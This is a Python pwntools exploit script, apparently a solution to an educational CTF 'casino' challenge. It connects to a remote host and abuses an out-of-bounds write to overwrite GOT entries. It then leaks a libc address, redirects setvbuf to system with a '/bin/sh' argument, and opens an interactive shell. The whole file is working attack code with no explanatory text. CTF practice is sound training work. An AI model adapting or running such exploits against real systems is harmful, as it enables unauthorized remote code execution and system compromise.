#!/usr/bin/python3
from pwn import *
context.update(arch='amd64', os='linux')

rand = [83, 86, 77, 15, 93, 35]
payload = b"A"*16 + p64(0) + b"A"*8  + b"/bin/sh\0"
r = remote('edu-ctf.csie.org', 10176)
main = 0x400b21
printf = 0x400700
casino = 0x40095d
libc_start = 0x601ff0
init = 0x400857
sh = 0x602110
sys_off = 0x4f440

def got_write(offset, address):
	r.recv()
	r.sendline(str(1))
	r.recv()
	r.sendline(str(offset))
	r.recv()
	r.sendline(str(address))

def first_r():
	for x in range(len(rand)):
		r.recv()
		r.sendline(str(x))

def second_r():
	for x in range(len(rand)):
		r.recv()
		r.sendline(str(rand[x]))

def name():
	r.recv()
	r.sendline(payload)

def age():
	r.recv()
	r.sendline("20")

def puts2casino():
	first_r()
	got_write(-42, 0)
	second_r()
	got_write(-43, casino)
	
def setbuf2printf():
	first_r()	
	got_write(-31, printf)
	second_r()	
	got_write(-30, 0)

def time2casino():
	first_r()
	got_write(-33, casino)
	second_r()
	got_write(-32, 0)

def stderr2libc():
	first_r()
	got_write(-11,libc_start)
	second_r()
	got_write(-10,0)

def puts2init():
	
	first_r()
	got_write(-42, 0)	
	second_r()
	got_write(-43, init)

if __name__ == '__main__':
	name()
	age()
	puts2casino()
	setbuf2printf()
	time2casino()
	stderr2libc()
	puts2init()
	libc = int(u64(r.recvline()[30:36]+b'\0\0')) - 0x021ab0
	libch = (libc + sys_off) >> 32
	libcl = (libc + sys_off) - (libch << 32)
	
	# puts to casino
	r.sendline(str(0))
	for x in range(len(rand)-1):
		r.recv()
		r.sendline(str(x+1))
	got_write(-43, casino)
	second_r()
	got_write(-42, 0)

	# setvbuf to system
	first_r()
	got_write(-31, libcl)
	second_r()
	got_write(-30, libch)

	time2casino()
	
	# stderr to /bin/sh
	first_r()
	got_write(-11, sh)
	second_r()
	got_write(-10, 0)

	puts2init()

	r.interactive()
